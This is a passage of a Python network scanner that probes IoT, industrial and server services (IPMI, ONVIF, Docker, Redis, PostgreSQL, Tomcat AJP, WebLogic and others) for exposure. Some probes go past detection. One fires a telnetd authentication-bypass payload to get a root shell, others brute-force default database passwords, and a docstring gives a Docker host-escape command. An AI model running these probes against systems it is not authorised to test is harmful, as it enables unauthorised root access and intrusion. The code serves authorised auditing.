            b'\x00\x00\x00\x00\x00'       # Auth type=none, session seq=0 (4 bytes)
            b'\x00\x00\x00\x00'           # Session ID = 0
            b'\x09'                        # IPMI msg length = 9
            b'\x20\x18\xc8'               # rs_addr=BMC(0x20), netFn/LUN=App(0x18), chk1=0xc8
            b'\x81\x00\x38\x0e\x04\x31'  # rq_addr, rq_seq, cmd=GetChanAuthCaps, chan, priv, chk2
        )
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            sock.sendto(PKT, (ip, port))
            data, _ = sock.recvfrom(256)
            sock.close()
            # Valid RMCP response starts with 0x06 and must be long enough
            if len(data) < 22 or data[0] != 0x06:
                return None
            # Completion code at byte 20 — non-zero means command failed
            if data[20] != 0x00:
                return {'alive': True, 'cipher0': False}
            # Byte 22: auth type support bitmask
            #   bit 0 = None/anonymous (cipher 0 — critical vulnerability)
            #   bit 1 = MD2, bit 2 = MD5, bit 4 = plaintext
            auth_support = data[22] if len(data) > 22 else 0
            # Byte 23: status bits — bit 5 = anonymous login enabled
            status = data[23] if len(data) > 23 else 0
            cipher0 = bool((auth_support & 0x01) or (status & 0x20))
            auth_desc = []
            if auth_support & 0x01: auth_desc.append('None/anonymous')
            if auth_support & 0x02: auth_desc.append('MD2')
            if auth_support & 0x04: auth_desc.append('MD5')
            if auth_support & 0x10: auth_desc.append('Plaintext')
            return {
                'alive':      True,
                'cipher0':    cipher0,
                'auth_types': ', '.join(auth_desc) if auth_desc else 'unknown',
            }
        except Exception:
            return None

    # ── WS-Discovery (ONVIF camera self-announcement) ─────────────────────────

    def probe_ws_discovery(self, ip, port=3702):
        """
        WS-Discovery unicast Probe on UDP 3702.
        ONVIF cameras broadcast themselves here — returns manufacturer, model,
        hardware info, and ONVIF service URLs without any credentials.
        """
        probe_xml = (
            '<?xml version="1.0" encoding="utf-8"?>'
            '<soap:Envelope '
            'xmlns:soap="http://www.w3.org/2003/05/soap-envelope" '
            'xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" '
            'xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery" '
            'xmlns:dn="http://www.onvif.org/ver10/network/wsdl">'
            '<soap:Header>'
            '<wsa:Action>'
            'http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe'
            '</wsa:Action>'
            '<wsa:MessageID>urn:uuid:fsec-0001-0001-0001-000000000001</wsa:MessageID>'
            '<wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To>'
            '</soap:Header>'
            '<soap:Body>'
            '<wsd:Probe>'
            '<wsd:Types>dn:NetworkVideoTransmitter</wsd:Types>'
            '</wsd:Probe>'
            '</soap:Body>'
            '</soap:Envelope>'
        ).encode()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            sock.sendto(probe_xml, (ip, port))
            data, _ = sock.recvfrom(8192)
            sock.close()
            text = data.decode('utf-8', errors='replace')
            if 'ProbeMatch' not in text and 'Envelope' not in text:
                return None
            result = {}
            m = re.search(r'<[^:>]*:?Types[^>]*>([^<]+)<', text)
            if m: result['types'] = m.group(1).strip()
            # Scopes contain manufacturer/model/location encoded as URIs
            m = re.search(r'<[^:>]*:?Scopes[^>]*>([^<]+)<', text)
            if m:
                scopes = m.group(1).strip()
                result['scopes'] = scopes
                for scope in scopes.split():
                    sl = scope.lower()
                    if '/hardware/' in sl:
                        result['hardware'] = scope.split('/')[-1]
                    elif '/name/' in sl:
                        result['name'] = scope.split('/')[-1]
                    elif '/location/' in sl:
                        result['location'] = scope.split('/')[-1]
                    elif '/onvif/' in sl:
                        result['profile'] = scope.split('/')[-1]
            m = re.search(r'<[^:>]*:?XAddrs[^>]*>([^<]+)<', text)
            if m: result['xaddrs'] = m.group(1).strip().split()[0]
            return result if result else {'alive': True}
        except Exception:
            return None

    # ── Tridium Niagara Fox ───────────────────────────────────────────────────

    def probe_niagara_fox(self, ip, port=1911):
        """
        Fox protocol on TCP 1911 — Tridium Niagara building automation.
        Controls HVAC, lighting, elevators, access control in commercial buildings.
        Server sends a hello banner on connect; we send ours back to get full info.
        """
        FOX_HELLO = (
            b'fox a 1 -1 fox hello\r\n'
            b'{\r\n'
            b'fox.version=s:1.0\r\n'
            b'id=i:1\r\n'
            b'hostName=s:scanner\r\n'
            b'hostAddress=s:0.0.0.0\r\n'
            b'app.version=s:3.7\r\n'
            b'scheme=s:\r\n'
            b'auth.token=s:\r\n'
            b'}\r\n;\r\n'
        )
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((ip, port))
            # Read server banner (server sends first)
            sock.settimeout(2)
            banner = b''
            try:
                banner = sock.recv(2048)
            except Exception:
                pass
            sock.settimeout(3)
            sock.send(FOX_HELLO)
            resp = b''
            try:
                resp = sock.recv(2048)
            except Exception:
                pass
            sock.close()
            full = (banner + resp).decode('utf-8', errors='replace')
            if 'fox' not in full.lower():
                return None
            result = {'alive': True}
            for pattern, key in [
                (r'hostName=s:([^\r\n{};]+)',    'hostName'),
                (r'hostAddress=s:([^\r\n{};]+)', 'hostAddress'),
                (r'app\.version=s:([^\r\n{};]+)','version'),
                (r'app\.name=s:([^\r\n{};]+)',   'app'),
                (r'sys\.name=s:([^\r\n{};]+)',   'station'),
            ]:
                m = re.search(pattern, full)
                if m:
                    val = m.group(1).strip()
                    if val and val not in ('', '0.0.0.0', 'scanner'):
                        result[key] = val
            return result
        except Exception:
            return None

    # ── Docker daemon API ─────────────────────────────────────────────────────

    def probe_docker_api(self, ip, port=2375):
        """
        Docker daemon REST API on TCP 2375 (unauthenticated).
        Exposed Docker socket = instant root: docker run -v /:/host alpine chroot /host sh
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((ip, port))
            req = f'GET /version HTTP/1.0\r\nHost: {ip}\r\n\r\n'.encode()
            sock.send(req)
            resp = b''
            while len(resp) < 8192:
                try:
                    chunk = sock.recv(4096)
                except Exception:
                    break
                if not chunk:
                    break
                resp += chunk
                if b'\r\n\r\n' in resp and len(resp) > 200:
                    break
            sock.close()
            text = resp.decode('utf-8', errors='replace')
            if '"Version"' not in text and '"ApiVersion"' not in text:
                return None
            result = {'unauthenticated': True}
            for pat, key in [
                (r'"Version"\s*:\s*"([^"]+)"',    'version'),
                (r'"Os"\s*:\s*"([^"]+)"',          'os'),
                (r'"Arch"\s*:\s*"([^"]+)"',        'arch'),
                (r'"ApiVersion"\s*:\s*"([^"]+)"',  'api_version'),
                (r'"KernelVersion"\s*:\s*"([^"]+)"','kernel'),
            ]:
                m = re.search(pat, text)
                if m: result[key] = m.group(1)
            # Also pull running container count from /info
            try:
                sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock2.settimeout(3)
                sock2.connect((ip, port))
                sock2.send(f'GET /info HTTP/1.0\r\nHost: {ip}\r\n\r\n'.encode())
                info_resp = b''
                while len(info_resp) < 16384:
                    chunk = sock2.recv(4096)
                    if not chunk: break
                    info_resp += chunk
                sock2.close()
                info_text = info_resp.decode('utf-8', errors='replace')
                m = re.search(r'"Containers"\s*:\s*(\d+)', info_text)
                if m: result['containers'] = int(m.group(1))
                m = re.search(r'"ContainersRunning"\s*:\s*(\d+)', info_text)
                if m: result['running'] = int(m.group(1))
                m = re.search(r'"Name"\s*:\s*"([^"]+)"', info_text)
                if m: result['hostname'] = m.group(1)
            except Exception:
                pass
            return result
        except Exception:
            return None

    # ── Hikvision SADP ───────────────────────────────────────────────────────

    def probe_hikvision_sadp(self, ip, port=37020):
        """
        Hikvision SADP (Search Active Device Protocol) on UDP 37020.
        Returns device type, firmware version, serial number, and the SDK port
        without any credentials. Used by Hikvision's own tools for discovery.
        """
        SADP_HDR = b'\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        SADP_XML = (
            b'<?xml version="1.0" encoding="utf-8"?>'
            b'<Probe>'
            b'<Uuid>fsec0000-0000-0000-0000-000000000001</Uuid>'
            b'<Types>inquiry</Types>'
            b'</Probe>'
        )
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            sock.sendto(SADP_HDR + SADP_XML, (ip, port))
            data, _ = sock.recvfrom(4096)
            sock.close()
            # Strip binary header (first 20 bytes) and decode XML
            xml_start = data.find(b'<?xml')
            if xml_start < 0:
                xml_start = data.find(b'<ProbeMatch')
            if xml_start < 0:
                return None
            text = data[xml_start:].decode('utf-8', errors='replace')
            if not any(k in text for k in ('ProbeMatch', 'DeviceType', 'SerialNumber')):
                return None
            result = {}
            for tag, key in [
                ('DeviceType',       'device_type'),
                ('SoftwareVersion',  'firmware'),
                ('SerialNumber',     'serial'),
                ('DeviceName',       'name'),
                ('CommandPort',      'sdk_port'),
                ('HttpPort',         'http_port'),
                ('IPv4Address',      'ip_reported'),
            ]:
                m = re.search(rf'<{tag}>([^<]+)<', text)
                if m: result[key] = m.group(1).strip()
            return result if result else {'alive': True}
        except Exception:
            return None

    # ── Telnet no-auth shell ─────────────────────────────────────────────────

    def probe_telnet_noauth(self, ip, port=23):
        """
        Connect to Telnet port 23 and check if a shell prompt appears WITHOUT
        any login/password prompt.  Very common on vulnerable IoT/embedded
        devices — the primary vector exploited by Mirai and its successors.
        Different from probe_telnet_creds: this catches devices that skip
        authentication entirely and drop the user straight into a shell.
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.settimeout(3)
            data = b''
            deadline = time.time() + 3
            while time.time() < deadline:
                try:
                    chunk = s.recv(256)
                    if not chunk:
                        break
                    # Strip IAC option-negotiation bytes (FF XX XX)
                    clean = re.sub(b'\xff[\xfb-\xfe].', b'', chunk)
                    data += clean
                except socket.timeout:
                    break
                except Exception:
                    break
            s.close()
            if not data:
                return None
            text = data.decode('utf-8', errors='replace').lower()
            has_shell = any(p in text for p in
                            ('# ', '$ ', '> ', '/bin', 'busybox', 'welcome to', 'root@'))
            has_auth  = any(p in text for p in
                            ('login:', 'username:', 'password:', 'user:', 'login as:'))
            if has_shell and not has_auth:
                return {
                    'no_auth': True,
                    'banner':  data.decode('utf-8', errors='replace').strip()[:200],
                }
            return None
        except Exception:
            return None

    # ── CVE-2026-24061 — telnetd NEW_ENVIRON auth bypass ────────────────────

    def probe_cve_2026_24061(self, ip, port=23):
        """
        CVE-2026-24061 — inetutils telnetd 1.9.3–2.7 authentication bypass.

        Sends a crafted Telnet NEW_ENVIRON subnegotiation that injects
        USER=-f root into the environment.  The -f flag tells login(1) to
        skip authentication for the named user, granting an instant root
        shell.  This vulnerability existed undetected for 11 years.

        Payload: IAC WILL NEW_ENVIRON · IAC SB NEW_ENVIRON IS USER=-f root · IAC SE
        Based on: https://github.com/0p5cur/CVE-2026-24061-POC
        """
        # Telnet IAC constants (RFC 854 / RFC 1572)
        EXPLOIT = (
            b'\xff\xfb\x27'              # IAC WILL NEW_ENVIRON
            b'\xff\xfa\x27\x00\x00'     # IAC SB NEW_ENVIRON IS  (0x00=IS, 0x00=VAR)
            b'USER\x01-f root'           # variable name + value separator + value
            b'\xff\xf0'                  # IAC SE (end of subnegotiation)
        )

        def _strip_iac(data: bytes) -> bytes:
            """Remove Telnet IAC option sequences (FF XX XX / FA...F0)."""
            out, i = b'', 0
            while i < len(data):
                if data[i] == 0xff and i + 1 < len(data):
                    if data[i + 1] in (0xfa,):           # SB — skip to SE
                        end = data.find(b'\xff\xf0', i + 2)
                        i = end + 2 if end >= 0 else len(data)
                    elif data[i + 1] in (0xfb, 0xfc, 0xfd, 0xfe) and i + 2 < len(data):
                        i += 3                             # WILL/WONT/DO/DONT + option
                    else:
                        i += 2
                else:
                    out += bytes([data[i]])
                    i += 1
            return out

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))
            # Drain initial server negotiation
            s.settimeout(2)
            initial = b''
            try:
                initial = s.recv(1024)
            except Exception:
                pass
            # Fire the exploit payload
            s.sendall(EXPLOIT)
            time.sleep(0.4)
            resp = b''
            try:
                resp = s.recv(2048)
            except Exception:
                pass
            s.close()

            clean = _strip_iac(initial + resp).decode('utf-8', errors='replace').lower()
            has_shell = any(p in clean for p in
                            ('# ', '$ ', '~#', 'root@', '/bin', 'busybox', 'sh-'))
            has_auth  = any(p in clean for p in
                            ('login:', 'username:', 'password:', 'incorrect'))

            if has_shell and not has_auth:
                return {'vulnerable': True, 'shell': True,
                        'banner': clean.strip()[:200]}
            # Possible vulnerable — server didn't reject but shell not confirmed
            if not has_auth and len(resp) > 4:
                return {'vulnerable': None, 'shell': False,
                        'banner': clean.strip()[:200]}
            return None
        except Exception:
            return None

    # ── MikroTik Winbox ──────────────────────────────────────────────────────

    def probe_mikrotik_winbox(self, ip, port=8291):
        """
        Detect MikroTik Winbox on TCP 8291.
        CVE-2018-14847: Winbox <= 6.42 allows unauthenticated read of the
        credential database — every username + password in plaintext.
        First byte of any valid Winbox response is 0x68 (M2 frame marker).
        """
        WINBOX_PROBE = bytes([
            0x68, 0x01, 0x00, 0x66,
            0x4d, 0x32, 0x05, 0x00,
            0xff, 0x01, 0x06, 0x00,
            0xff, 0x09, 0x05, 0x07,
            0x00, 0xff, 0x09, 0x07,
        ])
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            s.sendall(WINBOX_PROBE)
            resp = b''
            s.settimeout(2)
            try:
                resp = s.recv(512)
            except Exception:
                pass
            s.close()
            if not resp or resp[0:1] != b'\x68':
                return None
            result = {'alive': True, 'port': port}
            text = resp.decode('utf-8', errors='replace')
            m = re.search(r'(\d+\.\d+[\.\d]*)', text)
            if m:
                ver = m.group(1)
                result['version'] = ver
                try:
                    parts  = ver.split('.')
                    major  = int(parts[0])
                    minor  = int(parts[1])
                    result['cve_2018_14847'] = (major == 6 and minor <= 42) or major < 6
                except Exception:
                    pass
            return result
        except Exception:
            return None

    # ── Cisco Smart Install ──────────────────────────────────────────────────

    def probe_cisco_smi(self, ip, port=4786):
        """
        Detect Cisco Smart Install (CSI) on TCP 4786 — CVE-2018-0171.
        Unauthenticated: read/replace startup-config, upload arbitrary firmware.
        Used actively in the wild by APT groups (Slingshot) for persistence
        on Cisco IOS switches and routers.  Any CSI response = vulnerable.
        """
        SMI_HELLO = (
            b'\x00\x00\x00\x01'   # magic
            b'\x00\x00\x00\x01'   # version
            b'\x00\x00\x00\x04'   # message type: CLIENT_UPGRADE_REQUEST
            b'\x00\x00\x00\x08'   # length
            b'\x00\x00\x00\x01'
            b'\x00\x00\x00\x00'
            b'\x00\x00\x00\x00'
        )
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            s.sendall(SMI_HELLO)
            resp = b''
            s.settimeout(2)
            try:
                resp = s.recv(256)
            except Exception:
                pass
            s.close()
            if not resp:
                return None
            result = {'alive': True, 'port': port, 'response': resp[:8].hex()}
            text = resp.decode('utf-8', errors='replace')
            m = re.search(r'IOS.*?(\d+\.\d+[\(\)\.\d]+)', text)
            if m:
                result['ios_version'] = m.group(1)
            return result
        except Exception:
            return None

    # ── NFS ──────────────────────────────────────────────────────────────────

    def probe_nfs(self, ip, port=2049):
        """
        Detect NFS exports on TCP 2049.
        Uses `showmount -e` to enumerate exported shares without credentials.
        Any exported path reachable by * or a broad CIDR = unauthenticated mount.
        """
        import shutil as _shutil
        result = {'alive': False, 'exports': [], 'mountable': False}
        # Quick TCP connect first
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            s.close()
            result['alive'] = True
        except Exception:
            return None

        # showmount -e for share enumeration
        showmount = _shutil.which('showmount')
        if showmount:
            try:
                out = subprocess.check_output(
                    [showmount, '-e', '--no-headers', ip],
                    stderr=subprocess.DEVNULL,
                    timeout=8
                ).decode('utf-8', errors='replace')
                exports = []
                for line in out.strip().splitlines():
                    line = line.strip()
                    if not line:
                        continue
                    parts = line.split()
                    path   = parts[0] if parts else line
                    access = parts[1] if len(parts) > 1 else '*'
                    exports.append({'path': path, 'access': access})
                    if access in ('*', '(everyone)', 'everyone') or '0/0' in access:
                        result['mountable'] = True
                result['exports'] = exports
            except subprocess.TimeoutExpired:
                result['showmount_timeout'] = True
            except Exception:
                pass
        return result

    # ── Redis ─────────────────────────────────────────────────────────────────

    def probe_redis(self, ip, port=6379):
        """
        Check for unauthenticated or default-password Redis on TCP 6379.
        Sends PING — +PONG = open access.  Also pulls INFO server for version
        and checks CONFIG GET dir to assess write-to-disk capability (RCE path).
        """
        _CREDS = ['', 'redis', 'password', 'admin', '123456', 'root', 'default']
        result = {'alive': False, 'authenticated': False, 'version': None,
                  'writable': False, 'password': None}
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            s.settimeout(2)

            # Try unauthenticated PING first
            s.sendall(b'*1\r\n$4\r\nPING\r\n')
            resp = b''
            try: resp = s.recv(256)
            except Exception: pass

            if b'+PONG' in resp:
                result['alive'] = True
                result['authenticated'] = True
                result['password'] = ''
            elif b'NOAUTH' in resp or b'WRONGPASS' in resp or b'Authentication' in resp:
                result['alive'] = True
                # Try common passwords
                for pw in _CREDS[1:]:
                    try:
                        s.close()
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(3)
                        s.connect((ip, port))
                        s.settimeout(2)
                        auth_cmd = f'*2\r\n$4\r\nAUTH\r\n${len(pw)}\r\n{pw}\r\n'
                        s.sendall(auth_cmd.encode())
                        ar = b''
                        try: ar = s.recv(64)
                        except Exception: pass
                        if b'+OK' in ar:
                            result['authenticated'] = True
                            result['password'] = pw
                            break
                    except Exception:
                        continue

            if not result['alive']:
                s.close()
                return None

            if result['authenticated']:
                # Pull version from INFO server
                try:
                    s.sendall(b'*2\r\n$4\r\nINFO\r\n$6\r\nserver\r\n')
                    info = b''
                    s.settimeout(2)
                    try: info = s.recv(2048)
                    except Exception: pass
                    m = re.search(rb'redis_version:(\S+)', info)
                    if m:
                        result['version'] = m.group(1).decode('utf-8', errors='replace')
                except Exception:
                    pass
                # Check if CONFIG dir is writable (RCE via cron/SSH key write)
                try:
                    s.sendall(b'*3\r\n$6\r\nCONFIG\r\n$3\r\nGET\r\n$3\r\ndir\r\n')
                    cr = b''
                    try: cr = s.recv(256)
                    except Exception: pass
                    if b'dir' in cr or b'/var' in cr or b'/root' in cr or b'/home' in cr:
                        result['writable'] = True
                        m2 = re.search(rb'\$\d+\r\n(/[^\r\n]+)', cr)
                        if m2:
                            result['dir'] = m2.group(1).decode('utf-8', errors='replace')
                except Exception:
                    pass

            s.close()
            return result
        except Exception:
            return None

    # ── PostgreSQL ────────────────────────────────────────────────────────────

    def probe_postgres(self, ip, port=5432):
        """
        Check for unauthenticated or default-credential PostgreSQL on TCP 5432.
        Sends a StartupMessage; AuthenticationOk (type 0) = trust auth (no password).
        Falls back to trying common default credential pairs via raw protocol or psql.
        """
        import struct as _struct
        _CREDS = [
            ('postgres', ''),
            ('postgres', 'postgres'),
            ('postgres', 'password'),
            ('postgres', 'admin'),
            ('postgres', '123456'),
            ('postgres', 'root'),
            ('admin',    'admin'),
            ('root',     'root'),
        ]
        result = {'alive': False, 'authenticated': False,
                  'auth_type': None, 'user': None, 'password': None,
                  'version': None, 'trust': False}

        def _startup(user, database='postgres'):
            params = b'user\x00' + user.encode() + b'\x00database\x00' + database.encode() + b'\x00\x00'
            # Protocol version 3.0 = 196608
            msg = _struct.pack('>I', 196608) + params
            length = _struct.pack('>I', len(msg) + 4)
            return length + msg

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.settimeout(3)
            result['alive'] = True

            # Send startup as postgres/postgres
            s.sendall(_startup('postgres'))
            resp = b''
            try: resp = s.recv(512)
            except Exception: pass

            if not resp:
                s.close()
                return result

            # Byte 0 = message type: R=Authentication, E=Error
            if resp[0:1] == b'R' and len(resp) >= 9:
                auth_type = _struct.unpack('>I', resp[5:9])[0]
                result['auth_type'] = auth_type
                if auth_type == 0:
                    # Trust — no password required
                    result['authenticated'] = True
                    result['trust'] = True
                    result['user'] = 'postgres'
                    result['password'] = ''
                    # Pull version from ParameterStatus messages
                    try:
                        more = s.recv(1024)
                        m = re.search(rb'PostgreSQL (\d+\.\d+)', more)
                        if not m:
                            m = re.search(rb'(\d+\.\d+)', more)
                        if m:
                            result['version'] = m.group(1).decode('utf-8', errors='replace')
                    except Exception:
                        pass
                elif auth_type in (3, 5):
                    # Cleartext or MD5 — try default creds via psql if available
                    import shutil as _shutil
                    psql = _shutil.which('psql')
                    if psql:
                        for user, pw in _CREDS:
                            env = {'PGPASSWORD': pw, 'PATH': '/usr/bin:/bin'}
                            try:
                                out = subprocess.check_output(
                                    [psql, '-h', ip, '-p', str(port),
                                     '-U', user, '-d', 'postgres',
                                     '-c', 'SELECT version();', '-t', '-A'],
                                    env=env,
                                    stderr=subprocess.DEVNULL,
                                    timeout=5
                                ).decode('utf-8', errors='replace')
                                if 'PostgreSQL' in out or out.strip():
                                    result['authenticated'] = True
                                    result['user'] = user
                                    result['password'] = pw
                                    m = re.search(r'PostgreSQL (\d+\.\d+)', out)
                                    if m:
                                        result['version'] = m.group(1)
                                    break
                            except Exception:
                                continue
            s.close()
            return result
        except Exception:
            return None

    # ── Tomcat AJP / Ghostcat CVE-2020-1938 ─────────────────────────────────

    def probe_ghostcat(self, ip, port=8009):
        """
        Detect Apache Tomcat AJP connector on TCP 8009 — CVE-2020-1938 Ghostcat.
        Sends a minimal AJP13 FORWARD_REQUEST for /WEB-INF/web.xml;
        any AJP response (magic 0x1234) confirms the connector is open.
        An unauthenticated AJP connector allows arbitrary file read from
        any webapp and file inclusion if the app accepts file uploads.
        """
        # AJP13 FORWARD_REQUEST for GET /WEB-INF/web.xml HTTP/1.0
        # Ref: AJP13 spec — magic 0x1234, type 0x02 = FORWARD_REQUEST
        AJP_REQ = (
            b'\x12\x34'          # magic
            b'\x00\x0e'          # data length (14 bytes)
            b'\x02'              # type: FORWARD_REQUEST
            b'\x02'              # method: GET
            b'\x00\x08HTTP/1.0'  # protocol
            b'\x00\x14/WEB-INF/web.xml'  # req_uri (padded)
            b'\x00\x00'          # remote_addr (empty)
            b'\x00\x00'          # remote_host (empty)
            b'\x00\x00'          # server_name (empty)
            b'\x00\x50'          # server_port 80
            b'\x00'              # is_ssl false
            b'\x00\x00'          # num_headers
            b'\xff'              # terminator
        )
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.sendall(AJP_REQ)
            s.settimeout(3)
            resp = b''
            try: resp = s.recv(512)
            except Exception: pass
            s.close()
            # AJP response magic is 0x4142 ("AB")
            if resp[:2] in (b'\x41\x42', b'AB') or len(resp) > 4:
                result = {'alive': True, 'port': port}
                if b'web.xml' in resp or b'<?xml' in resp or b'webapp' in resp.lower():
                    result['file_read'] = True
                return result
            # Also flag if we get any non-empty TCP response (connector is open)
            if resp:
                return {'alive': True, 'port': port, 'banner': resp[:32].hex()}
            return None
        except Exception:
            return None

    # ── Oracle WebLogic ───────────────────────────────────────────────────────

    def probe_weblogic(self, ip, port=7001):
        """
        Detect Oracle WebLogic Server on TCP 7001 — CVE-2019-2725 / CVE-2015-4852.
        Sends a T3 protocol handshake; 'HELO' response confirms WebLogic is listening.
        T3/IIOP deserialization allows pre-auth RCE (CVSS 9.8) without credentials.
        """
        # T3 protocol handshake
        T3_HELLO = b't3 12.2.3\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.sendall(T3_HELLO)
            s.settimeout(3)
            resp = b''
            try: resp = s.recv(512)
            except Exception: pass
            s.close()
            if b'HELO' in resp or b'weblogic' in resp.lower() or b't3' in resp.lower():
                result = {'alive': True, 'port': port}
                # Extract version from HELO response e.g. "HELO:12.2.1.4.0"
                m = re.search(rb'HELO[:\s]+([0-9.]+)', resp)
                if m:
                    result['version'] = m.group(1).decode('utf-8', errors='replace')
                return result
            # Fallback: HTTP banner check (admin console on same port)
            try:
                s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s2.settimeout(4)
                s2.connect((ip, port))
                s2.sendall(b'GET /console HTTP/1.0\r\nHost: ' + ip.encode() + b'\r\n\r\n')
                s2.settimeout(3)
                hr = b''
                try: hr = s2.recv(1024)
                except Exception: pass
                s2.close()
                if b'WebLogic' in hr or b'weblogic' in hr.lower() or b'console.portal' in hr:
                    return {'alive': True, 'port': port, 'console': True}
            except Exception:
                pass
            return None
        except Exception:
            return None

    def probe_pjl(self, ip, port=9100):
        """
        Confirm a real PJL printer on TCP 9100.
        Sends PJL Universal Exit Language escape + INFO ID command.
        Only genuine JetDirect/PJL printers reply with @PJL — eliminates false positives.
        """
        try:
            s = socket.create_connection((ip, port), timeout=self.timeout)
            s.sendall(b'\x1b%-12345X@PJL INFO ID\r\n\x1b%-12345X')
            data = b''
            s.settimeout(2)
            try:
                while len(data) < 1024:
                    chunk = s.recv(512)
                    if not chunk:
                        break
                    data += chunk
            except Exception:
                pass
            s.close()
            if b'@PJL' not in data and b'PJL' not in data:
                return None
            model = ''
            for line in data.decode('utf-8', errors='replace').splitlines():
                line = line.strip().strip('"')
                if line and not line.startswith('\x1b') and '@PJL' not in line:
                    model = line
                    break
            return {'alive': True, 'model': model or 'Unknown'}
        except Exception:
            return None

    # ── Dispatcher ───────────────────────────────────────────────────────────

    def run_probes(self, ip, open_tcp: set, open_udp: set,
                   device_hint='Unknown', workers=5):
        """
        Run all protocol probes in parallel (default 5 simultaneous per device).

        Phase 1 — protocol probes (all ports checked concurrently).
        Phase 2 — deep fingerprinting (HTTP device endpoints, ONVIF, banners),
                  also run in parallel, scheduled after phase 1 so we can use
                  its results to decide which deep probes to run.
        """

        def _run(fn):
            """Execute one probe, swallow all exceptions, return result or None."""
            try:
                return fn()
            except Exception:
                return None

        # ── Build task list ───────────────────────────────────────────────────
        # All tasks (phase 1 + phase 2) collected first, run in ONE pool.
        # SNMP is always attempted directly (UDP probe) — faster and more
        # reliable than waiting for nmap to discover UDP 161.

        tasks = []

        # Protocol probes — only for confirmed open ports
        tcp_probes = {
            22:    ('ssh',        lambda: self.probe_ssh(ip)),
            445:   ('smb',        lambda: self.probe_smb(ip)),
            102:   ('s7',         lambda: self.probe_s7(ip)),
            502:   ('modbus',     lambda: self.probe_modbus(ip)),
            554:   ('rtsp',       lambda: self.probe_rtsp(ip, 554)),
            1883:  ('mqtt',       lambda: self.probe_mqtt(ip, 1883)),
            1911:  ('fox',        lambda: self.probe_niagara_fox(ip, 1911)),
            1962:  ('pcworx',     lambda: self.probe_http(ip, 1962)),
            2049:  ('nfs',        lambda: self.probe_nfs(ip, 2049)),
            2375:  ('docker',     lambda: self.probe_docker_api(ip, 2375)),
            5432:  ('postgres',   lambda: self.probe_postgres(ip, 5432)),
            6379:  ('redis',      lambda: self.probe_redis(ip, 6379)),
            7001:  ('weblogic',   lambda: self.probe_weblogic(ip, 7001)),
            8009:  ('ghostcat',   lambda: self.probe_ghostcat(ip, 8009)),
            2404:  ('iec104',     lambda: self.probe_iec104(ip)),
            4786:  ('cisco_smi',  lambda: self.probe_cisco_smi(ip, 4786)),
            4840:  ('opc_ua',     lambda: self.probe_opc_ua(ip)),
            4911:  ('fox_ssl',    lambda: self.probe_niagara_fox(ip, 4911)),
            8291:  ('winbox',     lambda: self.probe_mikrotik_winbox(ip, 8291)),
            8554:  ('rtsp_alt',   lambda: self.probe_rtsp(ip, 8554)),
            8728:  ('winbox_api', lambda: self.probe_mikrotik_winbox(ip, 8728)),
            8883:  ('mqtt_ssl',   lambda: self.probe_mqtt(ip, 8883)),
            20000: ('dnp3',       lambda: self.probe_dnp3(ip)),
            44818: ('enip',       lambda: self.probe_enip(ip)),
            9100:  ('pjl',        lambda: self.probe_pjl(ip, 9100)),
            80:    ('http_80',    lambda: self.probe_http(ip, 80)),
            89:    ('http_89',    lambda: self.probe_http(ip, 89)),
            443:   ('http_443',   lambda: self.probe_http(ip, 443)),
            8000:  ('http_8000',  lambda: self.probe_http(ip, 8000)),
            8080:  ('http_8080',  lambda: self.probe_http(ip, 8080)),
            8443:  ('http_8443',  lambda: self.probe_http(ip, 8443)),
            8888:  ('http_8888',  lambda: self.probe_http(ip, 8888)),
        }
        udp_probes = {
            1900:  ('upnp',    lambda: self.probe_upnp(ip)),
            3702:  ('wsd',     lambda: self.probe_ws_discovery(ip, 3702)),
            5683:  ('coap',    lambda: self.probe_coap(ip)),
            37020: ('hik_sadp',lambda: self.probe_hikvision_sadp(ip, 37020)),
            47808: ('bacnet',  lambda: self.probe_bacnet(ip)),
        }

        for port, (name, fn) in tcp_probes.items():
            if port in open_tcp:
                tasks.append((name, fn))
        for port, (name, fn) in udp_probes.items():
            if port in open_udp:
                tasks.append((name, fn))

        # SNMP — always probe directly (UDP, no nmap dependency)
        tasks.append(('snmp', lambda: self.probe_snmp(ip)))
        # IPMI — always probe directly (UDP 623, commonly missed)
        tasks.append(('ipmi', lambda: self.probe_ipmi(ip, 623)))
        # Hikvision SADP — always probe directly (UDP 37020)
        if 37020 not in open_udp:  # avoid duplicate if nmap found it
            tasks.append(('hik_sadp', lambda: self.probe_hikvision_sadp(ip, 37020)))
        # WS-Discovery — always probe directly (UDP 3702, cameras may not appear in TCP scan)
